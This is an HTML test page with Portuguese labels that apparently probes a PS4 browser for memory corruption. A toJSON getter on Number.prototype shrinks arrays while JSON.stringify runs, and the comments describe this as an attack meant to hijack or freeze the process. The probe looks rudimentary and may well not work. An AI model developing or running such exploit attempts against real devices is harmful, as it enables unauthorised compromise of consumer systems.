<!DOCTYPE html>
<html>
<head>
    <title>PS4 X-Ray Debug (Step-by-Step)</title>
    <style>
        body { background: #000; color: #ff0; font-family: monospace; padding: 20px; font-size: 24px; }
        #log { border: 1px solid #444; padding: 10px; }
    </style>
</head>
<body>
    <h3>DEBUG PASSO-A-PASSO</h3>
    <div id="log">Aguardando...</div>

    <script>
        const logDiv = document.getElementById('log');
        function log(msg) {
            logDiv.innerHTML += `<div>${msg}</div>`;
        }

        async function runDebug() {
            log("1. Criando Vítimas...");
            let victims = [];
            for(let i=0; i<100; i++) victims.push([1.1, 2.2]);
            
            log("2. Definindo Armadilha toJSON...");
            let trapCount = 0;
            
            Object.defineProperty(Number.prototype, "toJSON", {
                get: function() {
                    // SE APARECER ISSO NA TELA, O PROCESSO FOI SEQUESTRADO
                    trapCount++;
                    log(`>>> ARMADILHA ATIVADA! (${trapCount}) <<<`);
                    
                    // O Ataque:
                    log("3. Executando Corrupção...");
                    victims[0].length = 0; // Zera array
                    
                    // Tenta forçar o travamento aqui
                    let junk = new ArrayBuffer(1024*10);
                    
                    log("4. Saindo da Armadilha...");
                    return "hacked";
                }
            });

            log("5. Preparando Gatilho...");
            let bait = [123]; // Array com número para ativar toJSON
            
            await new Promise(r => setTimeout(r, 500)); // Pausa dramática
            
            log("6. DISPARANDO JSON.stringify AGORA...");
            
            try {
                // O CONSOLE DEVE CONGELAR AQUI SE FOR VULNERÁVEL
                JSON.stringify(bait); 
                log("7. Sobreviveu (Falha no Deadlock)");
            } catch(e) {
                log("Erro capturado: " + e.message);
            }
        }

        setTimeout(runDebug, 1000);
    </script>
</body>
</html>
